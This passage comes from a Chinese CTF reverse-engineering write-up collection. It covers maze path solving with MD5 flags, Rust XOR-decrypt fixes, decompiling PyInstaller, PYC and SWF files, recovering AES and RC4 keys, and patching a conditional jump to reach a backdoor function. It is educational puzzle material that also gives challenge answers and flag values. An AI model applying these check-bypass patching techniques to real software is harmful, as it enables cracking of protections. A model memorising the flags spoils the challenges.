\n\n\nmap_str = \"\"\"   \n################################   \n#Y#                   #       X#   \n# # ############# ### # ### ## #   \n# #   #         # #   #   #   ##   \n# ##### ####### ### # ### ### ##   \n#   #   #     # #   #   # #   ##   \n### # ### ##### # ####### # ####   \n# #   # #     # #     #   #   ##   \n# ##### # ### # # ### # ##### ##   \n#         #   # #   #       # ##   \n# ######### # # ############# ##   \n#   # #     # #   #           ##   \n### # # ######### # ######### ##   \n# # # #           # #       # ##   \n# # # ############# # ##### # ##   \n#   #       #       # #   #   ##   \n#X ## ### ### # ##### # ########   \n#   #   #     #   # # #   #   ##   \n### ### ######### # # # # # # ##   \n# # #   #   #   # # # # # # # ##   \n# # ### # # # # # # # ### # # ##   \n# #   # # #   #   #   #   # # ##   \n# ### ### ########### # # # # ##   \n#   #   #           # # # # # ##   \n# ##### # ######### # # ### # ##   \n#   #   #   #       # # #   # ##   \n### # ####### ####### # # ### ##   \n#   #   #   # #     # #   #   ##   \n# ##### # # # # ##### ##### # ##   \n#         #   #             #   #   \n#X ############ X ########### X#   \n################################   \n\"\"\"   \n\npath = find_shortest_path(map_str)   \nprint(f\"\u5b8c\u6574\u8def\u5f84: {path}\")   \nprint(f\"\u603b\u957f\u5ea6: {len(path)}\")   \nprint(f\"\u6700\u540e\u56db\u6b65: {path[-4:] if len(path) &gt;= 4 else path}\")\n</code></pre> <p>\u8dd1\u51fa\u6765\u4e0d\u5bf9\uff0c\u731c\u6d4b\u6709\u591a\u89e3 \u7ecf\u8fc7\u624b\u6263\u53d1\u73b0\u6709\u7684\u5730\u65b9\u8def\u5f84\u4e0d\u552f\u4e00 \u5177\u4f53\u5982\u4e0b</p> <pre><code>ssssddssddwwddwwddddddddssssssssddssaaaaaaaaaawwddddwwddwwaaaassaaaaaaaassddssssa(as,sa)(sd,ds)dssssddssddssaassddssaaaaa(as,sa)(wd,dw)dddddddwwddssddwwwwddddddwwaaaaaaaaaawwwwddssddwwddssddwwwwaawwddddwwwwddddddddddwwwwaawwddwwaawwdddaaassddssaassddssssssssaawwaaaaaassssssssssssssssaaaa(as,sa)(wd,dw)ddddddddddwwddss(ds,sd)\n</code></pre> <p>\u76f4\u63a5\u5199\u811a\u672c\u7b97\u4e00\u4e0b\u7b26\u5408\u6761\u4ef6\u7684\u6bcf\u4e00\u4e2a\u7684 md5 \u63d0\u4ea4\u5373\u53ef\uff08\u4ece\u540e\u5f80\u524d\u7b2c\u4e00\u4e2a\u5c31\u662f\uff09</p> <pre><code>import re   \nimport hashlib   \nfrom itertools import product   \n\npath_str = (   \n\"ssssddssddwwddwwddddddddssssssssddssaaaaaaaaaawwddddwwddwwaaaassaaaaaaaassddssssa(as,sa)(sd,ds)dssssddssddssaassddssaaaaa(as,sa)(wd,dw)dddddddwwddssddwwwwddddddwwaaaaaaaaaawwwwddssddwwddssddwwwwaawwddddwwwwddddddddddwwwwaawwddwwaawwdddaaassddssaassddssssssssaawwaaaaaassssssssssssssssaaaa(as,sa)(wd,dw)ddddddddddwwddss(ds,sd)\"   \n)   \n\npattern = re.compile(r'\\(([^()]+)\\)')   \nsegments = []   \nlast_index = 0   \n\nfor match in pattern.finditer(path_str):   \n    segments.append([path_str[last_index:match.start()]])   \n    options = match.group(1).split(',')   \n    segments.append(options)   \n    last_index = match.end()   \n\nsegments.append([path_str[last_index:]])   \n\ncombinations = [''.join(p) for p in product(*segments)]   \n\nresult = []   \nfor path in combinations:   \n    if path.endswith('ssds'):   \n        md5_hash = hashlib.md5(path.encode()).hexdigest()   \n        result.append((path, f'palu{{{md5_hash}}}'))   \n\nfor path, md5 in result:   \n    print(f\"{md5}:\\n{path}\\n\")   \n\nprint(f\"\u5171\u5339\u914d\u8def\u5f84\u6570\u91cf: {len(result)}\")\n</code></pre> <p>\u8def\u5f84\u4e3a</p> <pre><code>ssssddssddwwddwwddddddddssssssssddssaaaaaaaaaawwddddwwddwwaaaassaaaaaaaassddssssasadsdssssddssddssaassddssaaaaasadwdddddddwwddssddwwwwddddddwwaaaaaaaaaawwwwddssddwwddssddwwwwaawwddddwwwwddddddddddwwwwaawwddwwaawwdddaaassddssaassddssssssssaawwaaaaaassssssssssssssssaaaasadwddddddddddwwddssds\n</code></pre> <p>flag\uff1a<code>palu{990fd7773f450f1f13bf08a367fe95ea}</code></p>"},{"location":"Reverse/Chapter11/11-1/","title":"\u4fee\u590d\u4ee3\u7801","text":""},{"location":"Reverse/Chapter11/11-1/#\u4fee\u590d\u4ee3\u7801","title":"\u4fee\u590d\u4ee3\u7801","text":"<p>\u9996\u5148\u662f\u642d\u5efa Rust \u73af\u5883\uff08Ubuntu\uff09</p> <p>\u6253\u5f00\u7ec8\u7aef\u6267\u884c\u4ee5\u4e0b\u547d\u4ee4\u5b89\u88c5 Rust\uff08\u9009\u9879\u76f4\u63a5\u56de\u8f66\u9ed8\u8ba4\uff09</p> <pre><code>curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh\n</code></pre> <p>\u5b89\u88c5\u5b8c\u540e\uff0c\u6267\u884c</p> <pre><code>source $HOME/.cargo/env\n</code></pre> <p>\u7136\u540e\u68c0\u67e5\u662f\u5426\u5b89\u88c5\u6210\u529f</p> <pre><code>rustc --version\ncargo --version\n</code></pre> <p>Rust fixme 1</p> <pre><code>use xor_cryptor::XORCryptor;\n\nfn main() {\n    // Key for decryption\n    let key = String::from(\"CSUCKS\"); // \u2705 \u52a0\u4e0a\u5206\u53f7\n\n    // Encrypted flag values\n    let hex_values = [\"41\", \"30\", \"20\", \"63\", \"4a\", \"45\", \"54\", \"76\", \"01\", \"1c\", \"7e\", \"59\", \"63\", \"e1\", \"61\", \"25\", \"7f\", \"5a\", \"60\", \"50\", \"11\", \"38\", \"1f\", \"3a\", \"60\", \"e9\", \"62\", \"20\", \"0c\", \"e6\", \"50\", \"d3\", \"35\"];\n\n    // Convert the hexadecimal strings to bytes and collect them into a vector\n    let encrypted_buffer: Vec&lt;u8&gt; = hex_values.iter()\n        .map(|&amp;hex| u8::from_str_radix(hex, 16).unwrap())\n        .collect();\n\n    // Create decryption object\n    let res = XORCryptor::new(&amp;key);\n    if res.is_err() {\n        return; // \u2705 \u6b63\u786e\u7684\u8fd4\u56de\u65b9\u5f0f\n    }\n    let xrc = res.unwrap();\n\n    // Decrypt flag and print it out\n    let decrypted_buffer = xrc.decrypt_vec(encrypted_buffer);\n    println!(\n        \"{}\", // \u2705 \u6b63\u786e\u7684\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\n        String::from_utf8_lossy(&amp;decrypted_buffer)\n    );\n}\n</code></pre> <p>\u5728\u7ec8\u7aef\u4e2d\u6267\u884c</p> <pre><code>cargo build\ncargo run\n</code></pre> <p></p> <p>Rust fixme 2</p> <pre><code>use xor_cryptor::XORCryptor;\n\nfn decrypt(encrypted_buffer: Vec&lt;u8&gt;, borrowed_string: &amp;mut String) {\n    let key = String::from(\"CSUCKS\");\n    borrowed_string.push_str(\"PARTY FOUL! Here is your flag: \");\n\n    let res = XORCryptor::new(&amp;key);\n    if res.is_err() {\n        return;\n    }\n    let xrc = res.unwrap();\n\n    let decrypted_buffer = xrc.decrypt_vec(encrypted_buffer);\n    borrowed_string.push_str(&amp;String::from_utf8_lossy(&amp;decrypted_buffer));\n\n    println!(\"{}\", borrowed_string);\n}\n\nfn main() {\n    let hex_values = [\"41\", \"30\", \"20\", \"63\", \"4a\", \"45\", \"54\", \"76\", \"01\", \"1c\", \"7e\", \"59\", \"63\", \"e1\", \"61\", \"25\", \"0d\", \"c4\", \"60\", \"f2\", \"12\", \"a0\", \"18\", \"03\", \"51\", \"03\", \"36\", \"05\", \"0e\", \"f9\", \"42\", \"5b\"];\n\n    let encrypted_buffer: Vec&lt;u8&gt; = hex_values.iter()\n        .map(|&amp;hex| u8::from_str_radix(hex, 16).unwrap())\n        .collect();\n\n    let mut party_foul = String::from(\"Using memory unsafe languages is a: \");\n    decrypt(encrypted_buffer, &amp;mut party_foul);\n}\n</code></pre> <p>Rust fixme 3</p> <pre><code>use xor_cryptor::XORCryptor;\n\nfn decrypt(encrypted_buffer: Vec&lt;u8&gt;, borrowed_string: &amp;mut String) {\n    let key = String::from(\"CSUCKS\");\n    borrowed_string.push_str(\"PARTY FOUL! Here is your flag: \");\n\n    let res = XORCryptor::new(&amp;key);\n    if res.is_err() {\n        return;\n    }\n    let xrc = res.unwrap();\n\n    unsafe {\n        let decrypted_buffer = xrc.decrypt_vec(encrypted_buffer);\n        let decrypted_ptr = decrypted_buffer.as_ptr();\n        let decrypted_len = decrypted_buffer.len();\n        let decrypted_slice = std::slice::from_raw_parts(decrypted_ptr, decrypted_len);\n        borrowed_string.push_str(&amp;String::from_utf8_lossy(decrypted_slice));\n    }\n    println!(\"{}\", borrowed_string);\n}\n\nfn main() {\n    let hex_values = [\"41\", \"30\", \"20\", \"63\", \"4a\", \"45\", \"54\", \"76\", \"12\", \"90\", \"7e\", \"53\", \"63\", \"e1\", \"01\", \"35\", \"7e\", \"59\", \"60\", \"f6\", \"03\", \"86\", \"7f\", \"56\", \"41\", \"29\", \"30\", \"6f\", \"08\", \"c3\", \"61\", \"f9\", \"35\"];\n    let encrypted_buffer: Vec&lt;u8&gt; = hex_values.iter()\n        .map(|&amp;hex| u8::from_str_radix(hex, 16).unwrap())\n        .collect();\n\n    let mut party_foul = String::from(\"Using memory unsafe languages is a: \");\n    decrypt(encrypted_buffer, &amp;mut party_foul);\n}\n</code></pre>"},{"location":"Reverse/Chapter2/2-1/","title":"EXE \u53cd\u7f16\u8bd1","text":""},{"location":"Reverse/Chapter2/2-1/#exe-\u53cd\u7f16\u8bd1","title":"EXE \u53cd\u7f16\u8bd1","text":"<p>\u5148\u641c\u7d22 flag \u53d1\u73b0\u5f88\u591a Py \u5f00\u5934</p> <p></p> <p>\u63a8\u6d4b\u7528 Python \u7f16\u8bd1\u7684\uff0c\u7528\u5de5\u5177 pyinstxtractor \u53cd\u7f16\u8bd1</p> <p></p> <p>\u6253\u5f00\u4e00\u4e2a 123.pyc \u6587\u4ef6\u770b\u5230 Base64 \u7f16\u7801</p> <p></p> <p>\u89e3\u7801\u62ff\u5230 flag</p> <p></p>"},{"location":"Reverse/Chapter2/2-2/","title":"PYC \u53cd\u7f16\u8bd1","text":""},{"location":"Reverse/Chapter2/2-2/#pyc-\u53cd\u7f16\u8bd1","title":"PYC \u53cd\u7f16\u8bd1","text":"<p>\u5c06 PYC \u6587\u4ef6\u653e\u5165\u5728\u7ebf\u7f51\u7ad9\u4e0a\u53cd\u7f16\u8bd1\u5f97\u5230\u6e90\u7801</p> <p></p> <p>\u5206\u6790\u4e0b\u8fd8\u662f\u5f88\u7b80\u5355\u7684</p> <p>\u5b57\u7b26\u7684\u524d\u4e00\u4f4d\u4e0e\u540e\u4e00\u4f4d\u8fdb\u884c\u5f02\u6216\u8d4b\u503c\u7ed9\u524d\u4e00\u4f4d</p> <p>\u56e0\u4e3a\u5b83\u662f\u6b63\u7740\u5f02\u6216\u7684\uff0c\u6240\u6709\u6211\u4eec\u5f97\u5012\u8fc7\u6765</p> <p>\u6700\u540e\u4e00\u4e2a\u6ca1\u6709\u8fdb\u884c\u5f02\u6216\u6240\u4ee5\u8df3\u8fc7</p> <p>\u6ce8\u610f\uff1aPython \u4e2d\u5faa\u73af\u4ece 0 \u5f00\u59cb\uff0c\u6240\u4ee5\u8981 - 2</p> <p>\u540e\u9762\u7684\u6a21\u8fd0\u7b97\u5c06 + \u6539\u4e3a - \u5373\u53ef</p> <p></p>"},{"location":"Reverse/Chapter3/3-1/","title":"SWF \u53cd\u7f16\u8bd1","text":""},{"location":"Reverse/Chapter3/3-1/#swf-\u53cd\u7f16\u8bd1","title":"SWF \u53cd\u7f16\u8bd1","text":"<p>\u4f7f\u7528 JPEXS Free Flash Decompiler \u53cd\u7f16\u8bd1</p> <p></p> <p>\u63d0\u53d6\u51fa\u97f3\u9891\u540e\u5728 Audacity \u4e2d\u5206\u6790\u9891\u8c31\u56fe\u62ff\u5230\u540e\u534a\u6bb5 flag</p> <p></p> <p>frames \u4e2d 441 \u5f20\u9ed1\u767d\u56fe\u7247\u8f6c\u4e8c\u8fdb\u5236</p> <p></p> <p>\u518d\u5c06\u4e8c\u8fdb\u5236\u586b\u5145\u4e3a\u4e8c\u7ef4\u7801\u62ff\u5230\u524d\u534a\u6bb5 flag</p> <p></p>"},{"location":"Reverse/Chapter4/4-1/","title":"JavaScript \u7834\u89e3","text":""},{"location":"Reverse/Chapter4/4-1/#javascript-\u7834\u89e3","title":"JavaScript \u7834\u89e3","text":"<p>\u5206\u6790\u6e90\u4ee3\u7801\u4e0e rotFlag \u505a\u4e86\u6bd4\u8f83\uff0c\u4fee\u6539\u4ee3\u7801\u5f39\u51fa rotFlag</p> <p></p> <p>\u8fd0\u884c\u4ee3\u7801\u8f93\u5165\u4ee3\u7801\u4e2d\u7684\u5b57\u7b26\u62ff\u5230 flag</p> <p></p>"},{"location":"Reverse/Chapter5/5-1/","title":"Strcmp() \u7834\u89e3","text":""},{"location":"Reverse/Chapter5/5-1/#strcmp-\u7834\u89e3","title":"Strcmp() \u7834\u89e3","text":"<p>\u653e\u5165 IDA \u4e2d\u53cd\u7f16\u8bd1</p> <p></p> <p>\u6309 TAB \u952e\u53cd\u7f16\u8bd1\u4e3a\u4f2a\u4ee3\u7801</p> <p></p> <p>strcmp() \u51fd\u6570\u6bd4\u8f83\u5b57\u7b26\u4e32\u662f\u5426\u76f8\u540c\uff0c\u53cc\u51fb &amp; xmm \u5730\u5740\u67e5\u770b\u6709\u5341\u516d\u8fdb\u5236\u6570\u5b57</p> <p></p> <p>\u590d\u5236\u8f6c ASCII \u662f\u5012\u8f6c\u7684 flag</p> <p></p>"},{"location":"Reverse/Chapter5/5-10/","title":"AES \u7834\u89e3","text":""},{"location":"Reverse/Chapter5/5-10/#aes-\u7834\u89e3","title":"AES \u7834\u89e3","text":"<p>\u53cd\u7f16\u8bd1 Apk \u6587\u4ef6</p> <p></p> <p>\u6838\u5fc3\u51fd\u6570\u5982\u4e0b</p> <p>\u53ef\u4ee5\u53d1\u73b0\u6709\u4e2a <code>SecondActivity.class</code></p> <pre><code>public void onClick(View view) {\n        switch (view.getId()) {\n            case R.id.button1 /* 2131165187 */:\n                if (this.c.getText().length() == 0 || this.d.getText().length() == 0) {\n                    Toast.makeText(this, \"\u4e0d\u80fd\u4e3a\u7a7a\", 1).show();\n                    return;\n                }\n                String obj = this.c.getText().toString();\n                String obj2 = this.d.getText().toString();\n                Log.e(\"test\", obj + \" test2 = \" + obj2);\n                Intent intent = new Intent(this, (Class&lt;?&gt;) SecondActivity.class);\n                intent.putExtra(\"ili\", obj);\n                intent.putExtra(\"lil\", obj2);\n                startActivity(intent);\n                return;\n            default:\n                return;\n        }\n    }\n</code></pre> <p>\u8fdb\u53bb\u770b\u770b</p> <p></p> <p>\u6838\u5fc3\u4ee3\u7801\u5982\u4e0b\uff1a</p> <pre><code>if (Encryto.doRawData(this, stringExtra + stringExtra2).equals(\"VEIzd/V2UPYNdn/bxH3Xig==\")) {\n            intent.setAction(\"android.test.action.MoniterInstallService\");\n            intent.setClass(this, MoniterInstallService.class);\n            intent.putExtra(\"company\", \"tencent\");\n            intent.putExtra(\"name\", \"hacker\");\n            intent.putExtra(\"age\", 18);\n            startActivity(intent);\n            startService(intent);\n        }\n</code></pre> <p>\u6211\u4eec\u9700\u8981\u53bb\u770b\u8fd9\u4e2a <code>Encryto.doRawData</code> \u662f\u4ec0\u4e48</p> <p>\u53cc\u51fb\u8fdb\u5165\u53d1\u73b0\u4e3a <code>native</code>\uff0c\u5e76\u4e14\u4e0b\u9762\u6709\u52a0\u8f7d\u5e93 <code>JNIEncrypt</code></p> <p></p> <p>\u5728\u5de6\u8fb9\u8d44\u6e90\u6587\u4ef6\u4e2d\u627e\u5230\u4e86\u540c\u540d\u7684 so \u6587\u4ef6</p> <p></p> <p>IDA \u52a0\u8f7d\u627e\u5230\u4e86 <code>doRawData</code> \u51fd\u6570</p> <p>\u5f88\u660e\u663e\u6709\u4f7f\u7528 AES \u52a0\u5bc6\uff0cv10 \u5219\u662f\u5bc6\u94a5\uff0cv4 \u5219\u662f\u6211\u4eec\u4f20\u5165\u7684\u503c</p> <p></p> <p>\u5f97\u5230\u5bc6\u94a5\u540e\u5bfb\u627e\u52a0\u5bc6\u5b57\u7b26\u4e32\u5728 <code>FileDataActivity</code> \u4e2d\u53d1\u73b0 <code>9YuQ2dk8CSaCe7DTAmaqAA==</code></p> <p></p> <p>AES \u89e3\u5bc6\u62ff\u5230 flag</p> <p></p>"},{"location":"Reverse/Chapter5/5-11/","title":"cmp \u6bd4\u8f83\u7834\u89e3","text":""},{"location":"Reverse/Chapter5/5-11/#cmp-\u6bd4\u8f83\u7834\u89e3","title":"cmp \u6bd4\u8f83\u7834\u89e3","text":"<p>\u6ca1\u6709\u58f3\u76f4\u63a5\u53cd\u7f16\u8bd1</p> <p></p> <p>\u9996\u5148\u8fdb\u53bb sub_4010F0() \u51fd\u6570\uff0c\u662f\u4e00\u4e2a\u731c\u6570\u5b57\u6e38\u620f</p> <p></p> <p>\u6309 TAB \u67e5\u770b\u6d41\u7a0b\u56fe</p> <p></p> <p>\u56e0\u4e3a\u9650\u5236\u4e86\u6211\u4eec\u53ea\u80fd\u731c\u4e00\u6b21\uff0c\u6240\u4ee5\u8981\u60f3\u7740\u7ed5\u8fc7\u53bb</p> <p>\u56e0\u4e3a\u4e0b\u9762\u7ed9\u51fa\u4e86\u540e\u95e8\u51fd\u6570\uff0c\u6240\u4ee5\u731c\u60f3\u80fd\u4e0d\u80fd\u76f4\u63a5\u8df3\u5230\u540e\u95e8\u51fd\u6570\u4ece\u800c\u7ed5\u8fc7\u6574\u4e2a\u5224\u65ad</p> <p></p> <p>\u53f3\u952e jle \u6307\u4ee4\u70b9\u51fb Assemble</p> <p></p> <p>\u4fee\u6539\u6307\u4ee4\u76f4\u63a5 jmp \u5230\u540e\u95e8\u51fd\u6570</p> <p></p> <p>\u6309\u56fe\u4e2d\u64cd\u4f5c\u4fdd\u5b58</p> <p></p> <p>\u56e0\u4e3a\u6709\u95ea\u9000\u7684\u60c5\u51b5\uff0c\u6240\u4ee5\u5728 OllyDbg \u4e2d\u6253\u5f00\u5c31\u884c</p> <p></p>"},{"location":"Reverse/Chapter5/5-12/","title":"RC4 \u52a0\u5bc6\u7834\u89e3","text":""},{"location":"Reverse/Chapter5/5-12/#rc4-\u52a0\u5bc6\u7834\u89e3","title":"RC4 \u52a0\u5bc6\u7834\u89e3","text":"<p>\u52a0\u5bc6\u8fc7\u7a0b\u5728\u8fd9\u4e2a\u51fd\u6570\u4e2d</p> <p></p> <p>\u9996\u5148\u7b2c\u4e00\u4e2a\u662f\u5bc6\u94a5\u7684\u751f\u6210</p> <p></p> <p>KSA\u8be6\u7ec6\u6b65\u9aa4\uff1a</p> <ol> <li>\u521d\u59cb\u5316 S \u76d2\uff1a\u521b\u5efa 256 \u5b57\u8282\u6570\u7ec4\uff0c\u521d\u59cb\u5316\u4e3a 0-255</li> <li>S[0] = 0, S[1] = 1, ..., S[255] = 255</li> <li>\u5bc6\u94a5\u6270\u4e71\uff1a</li> <li>\u521d\u59cb\u5316\u8ba1\u6570\u5668 j=0</li> <li>\u5bf9\u6bcf\u4e2a i \u4ece 0 \u5230 255\uff1a<ul> <li>j = (j + S[i] + key[i % key_length]) % 256</li> <li>\u4ea4\u6362 S[i] \u548c S[j]</li> </ul> </li> </ol> <pre><code>__int64 __fastcall sub_40067A(const char *a1, __int64 a2)\n{\n  // a1: \u6307\u5411\u5bc6\u94a5\u5b57\u7b26\u4e32\u7684\u6307\u9488\uff08\u5373\u524d\u9762\u7684 \"Nu1Lctf233\"\uff09\n  // a2: \u6307\u5411\u4e00\u4e2a 256 \u5b57\u8282\u6570\u7ec4\u7684\u6307\u9488\uff08\u7528\u4e8e\u521d\u59cb\u5316 S \u76d2\uff09\n  int v3; // [rsp+10h] [rbp-10h]    // \u4e34\u65f6\u53d8\u91cf\uff0c\u7528\u4e8e\u4ea4\u6362\u7d22\u5f15\n  int i; // [rsp+14h] [rbp-Ch]      // \u5faa\u73af\u8ba1\u6570\u5668\n  int j; // [rsp+18h] [rbp-8h]      // \u5faa\u73af\u8ba1\u6570\u5668\n  int v6; // [rsp+1Ch] [rbp-4h]     // \u5b58\u50a8\u5bc6\u94a5\u957f\u5ea6\n\n  v6 = strlen(a1);      // \u83b7\u53d6\u5bc6\u94a5\u957f\u5ea6(10)\n  v3 = 0;\n\n  // \u521d\u59cb\u5316 S \u76d2\uff1a0,1,2,...,255\n  for ( i = 0; i &lt;= 255; ++i )\n    *(i + a2) = i;\n\n  // j % v6\uff1a\u5faa\u73af\u4f7f\u7528\u5bc6\u94a5\u7684\u6bcf\u4e2a\u5b57\u8282\uff08\u56e0\u4e3a\u5bc6\u94a5\u901a\u5e38\u6bd4S\u76d2\u77ed\uff09\n  for ( j = 0; j &lt;= 255; ++j )\n  {\n    v3 = (*(j + a2) + v3 + a1[j % v6]) % 256;       // v3 \u8ba1\u7b97\n    sub_400646(j + a2, a2 + v3);    // \u4ea4\u6362\u51fd\u6570\n  }\n  return 0LL;\n}\n</code></pre> <p>PRGA\u8be6\u7ec6\u6b65\u9aa4\uff1a</p> <ol> <li>\u521d\u59cb\u5316 i=0, j=0</li> <li>\u5bf9\u4e8e\u6bcf\u4e2a\u8f93\u5165\u5b57\u8282\uff1a</li> <li>i = (i + 1) % 256</li> <li>j = (j + S[i]) % 256</li> <li>\u4ea4\u6362 S[i] \u548c S[j]</li> <li>t = (S[i] + S[j]) % 256</li> <li>\u5bc6\u94a5\u6d41\u5b57\u8282 k = S[t]</li> <li>\u8f93\u51fa\u5b57\u8282 = \u8f93\u5165\u5b57\u8282 ^ k</li> </ol> <pre><code>__int64 __fastcall sub_400753(__int64 a1, const char *a2, __int64 a3)\n{\n  // a1: \u6307\u5411\u521d\u59cb\u5316\u540e\u7684 S \u76d2\uff08\u7531 KSA \u751f\u6210\uff09\n  // a2: \u6307\u5411\u8981\u52a0\u5bc6/\u89e3\u5bc6\u7684\u8f93\u5165\u6570\u636e\uff08\u660e\u6587\u6216\u5bc6\u6587\uff09\n  // a3: \u6307\u5411\u8f93\u51fa\u7f13\u51b2\u533a\uff08\u5c06\u5b58\u50a8\u52a0\u5bc6/\u89e3\u5bc6\u7ed3\u679c\uff09\n  int v5; // [rsp+24h] [rbp-1Ch]\n  int v6; // [rsp+28h] [rbp-18h]\n  size_t v7; // [rsp+30h] [rbp-10h]\n  size_t v8; // [rsp+38h] [rbp-8h]\n\n  v5 = 0;       // \u5bf9\u5e94 RC4 \u4e2d\u7684 i\n  v6 = 0;       // \u5bf9\u5e94 RC4 \u4e2d\u7684 j\n  v7 = 0LL;     // \u5faa\u73af\u8ba1\u6570\u5668\uff0c\u8ddf\u8e2a\u5904\u7406\u4e86\u591a\u5c11\u5b57\u8282\n  v8 = strlen(a2);      // \u8f93\u5165\u6570\u636e\u7684\u957f\u5ea6\n  while ( v7 &lt; v8 )\n  {\n    v5 = (v5 + 1) % 256;    // \u66f4\u65b0 i\n    v6 = (v6 + *(v5 + a1)) % 256;   // \u66f4\u65b0 j\n    sub_400646(v5 + a1, a1 + v6);   // \u4ea4\u6362 S[i] \u548c S[j]\n    *(a3 + v7) = a2[v7] ^ *((*(v5 + a1) + *(v6 + a1)) + a1);    // \u751f\u6210\u5bc6\u94a5\u6d41\u5b57\u8282\u5e76\u5f02\u6216\n    ++v7;\n  }\n  return 0LL;\n}\n</code></pre> <pre><code>graph TD\n    A[\u5f00\u59cb] --&gt; B[\u8f93\u5165\u5bc6\u94a5\u548c\u660e\u6587]\n    B --&gt; C[KSA\u5bc6\u94a5\u8c03\u5ea6]\n    C --&gt; D[PRGA\u751f\u6210\u5bc6\u94a5\u6d41]\n    D --&gt; E[\u660e\u6587\u4e0e\u5bc6\u94a5\u6d41\u5f02\u6216]\n    E --&gt; F[\u8f93\u51fa\u5bc6\u6587]\n</code></pre> <p>\u53ef\u77e5\u672c\u9898\u7684\u5bc6\u94a5\u662f<code>Nu1Lctf233</code></p> <p></p> <p>\u52a0\u5bc6\u540e\u7684\u5bc6\u6587\u662f</p> <pre><code>[0xc6,0x21,0xca,0xbf,0x51,0x43,0x37,0x31,0x75,0xe4,0x8e,0xc0,0x54,0x6f,0x8f,0xee,0xf8,0x5a,0xa2,0xc1,0xeb,0xa5,0x34,0x6d,0x71,0x55,0x8,0x7,0xb2,0xa8,0x2f,0xf4,0x51,0x8e,0xc,0xcc,0x33,0x53,0x31,0x0,0x40,0xd6,0xca,0xec,0xd4]\n</code></pre> <p>\u8f6c\u6362\u4e00\u4e0b</p> <pre><code>import base64\n\na = [0xc6, 0x21, 0xca, 0xbf, 0x51, 0x43, 0x37, 0x31, 0x75, 0xe4, 0x8e, 0xc0, 0x54, 0x6f, 0x8f, 0xee, 0xf8, 0x5a, 0xa2,\n     0xc1, 0xeb, 0xa5, 0x34, 0x6d, 0x71, 0x55, 0x8, 0x7, 0xb2, 0xa8, 0x2f, 0xf4, 0x51, 0x8e, 0xc, 0xcc, 0x33, 0x53,\n     0x31, 0x0, 0x40, 0xd6, 0xca, 0xec, 0xd4]\ns = \"\"\nfor i in a:\n    s += chr(i)\n\nprint(str(base64.b64encode(s.encode('utf-8')), 'utf-8'))\n</code></pre> <p>\u89e3\u5bc6\u8fc7\u7a0b\uff1a</p> <ol> <li>\u51c6\u5907\u6570\u636e</li> </ol> <pre><code>a = [0xc6,0x21,...]  # \u52a0\u5bc6\u540e\u7684\u5b57\u8282\u6570\u7ec4\ns = \"\"\nfor i in a:\n    s += chr(i)  # \u5c06\u5b57\u8282\u503c\u8f6c\u6362\u4e3a\u5b57\u7b26\n</code></pre> <ol> <li>Base64 \u7f16\u7801</li> </ol> <pre><code>s = str(base64.b64encode(s.encode('utf-8')), 'utf-8')\n</code></pre> <ol> <li>RC4 KSA \u521d\u59cb\u5316</li> </ol> <pre><code>def rc4_init_sbox(key):\n    s_box = list(range(256))  # [0,1,2,...,255]\n    j = 0\n    for i in range(256):\n        j = (j + s_box[i] + ord(key[i % len(key)])) % 256\n        s_box[i], s_box[j] = s_box[j], s_box[i]  # \u4ea4\u6362\n    return s_box\n</code></pre> <ol> <li>RC4 \u89e3\u5bc6</li> </ol> <pre><code>def rc4_excrypt(plain, box):\n    plain = base64.b64decode(plain.encode('utf-8'))  # Base64 \u89e3\u7801\n    plain = bytes.decode(plain)  # \u5b57\u8282\u8f6c\u5b57\u7b26\u4e32\n    res = []\n    i = j = 0\n    for s in plain:  # \u904d\u5386\u5b57\u7b26\u4e32\u7684\u6bcf\u4e2a\u5b57\u7b26\n        i = (i + 1) % 256\n        j = (j + box[i]) % 256\n        box[i], box[j] = box[j], box[i]\n        t = (box[i] + box[j]) % 256\n        k = box[t]\n        res.append(chr(ord(s) ^ k))  # \u5b57\u7b26\u8f6c ASCII \u503c\uff0c\u5f02\u6216\uff0c\u518d\u8f6c\u56de\u5b57\u7b26\n    cipher = \"\".join(res)\n    return cipher\n</code></pre> <p>\u5b8c\u6574\u4ee3\u7801\u5982\u4e0b\uff1a</p> <pre><code>def rc4_decrypt(key, ciphertext):\n    # KSA: \u5bc6\u94a5\u8c03\u5ea6\u7b97\u6cd5\n    s_box = list(range(256))\n    j = 0\n    key_bytes = key.encode('latin1')  # \u4fdd\u6301\u5b57\u8282\u4e0d\u53d8\n\n    for i in range(256):\n        j = (j + s_box[i] + key_bytes[i % len(key_bytes)]) % 256\n        s_box[i], s_box[j] = s_box[j], s_box[i]\n\n    # PRGA: \u4f2a\u968f\u673a\u751f\u6210\u7b97\u6cd5\n    i = j = 0\n    plaintext = bytearray()\n\n    for byte in ciphertext:\n        i = (i + 1) % 256\n        j = (j + s_box[i]) % 256\n        s_box[i], s_box[j] = s_box[j], s_box[i]\n        t = (s_box[i] + s_box[j]) % 256\n        k = s_box[t]\n        plaintext.append(byte ^ k)  # \u76f4\u63a5\u5b57\u8282\u7ea7\u5f02\u6216\n\n    return bytes(plaintext)\n\n# \u539f\u59cb\u52a0\u5bc6\u6570\u636e\uff0845\u5b57\u8282\uff09\nciphertext = bytes([\n    0xC6, 0x21, 0xCA, 0xBF, 0x51, 0x43, 0x37, 0x31, \n    0x75, 0xE4, 0x8E, 0xC0, 0x54, 0x6F, 0x8F, 0xEE,\n    0xF8, 0x5A, 0xA2, 0xC1, 0xEB, 0xA5, 0x34, 0x6D, \n    0x71, 0x55, 0x08, 0x07, 0xB2, 0xA8, 0x2F, 0xF4,\n    0x51, 0x8E, 0x0C, 0xCC, 0x33, 0x53, 0x31, 0x00,\n    0x40, 0xD6, 0xCA, 0xEC, 0xD4\n])\n\nkey = \"Nu1Lctf233\"\nplaintext = rc4_decrypt(key, ciphertext)\n\nprint(\"Decrypted:\", plaintext)\nprint(\"As string:\", plaintext.decode('utf-8', errors='replace'))\n</code></pre>"},{"location":"Reverse/Chapter5/5-13/","title":"\u9b54\u6539 RC4 \u52a0\u5bc6\u7834\u89e3","text":""},{"location":"Reverse/Chapter5/5-13/#\u9b54\u6539-rc4-\u52a0\u5bc6\u7834\u89e3","title":"\u9b54\u6539 RC4 \u52a0\u5bc6\u7834\u89e3","text":"<p>IDA \u53cd\u7f16\u8bd1\uff0c\u6709\u82b1\u6307\u4ee4\uff0cNOP \u6389</p> <p></p> <p>\u8fdb\u5165 main \u51fd\u6570 \u6709\u4e2a hook \u51fd\u6570 \u8ddf\u8fdb</p> <p>\u5bc6\u6587\u5bc6\u94a5\u5982\u4e0b</p> <p></p> 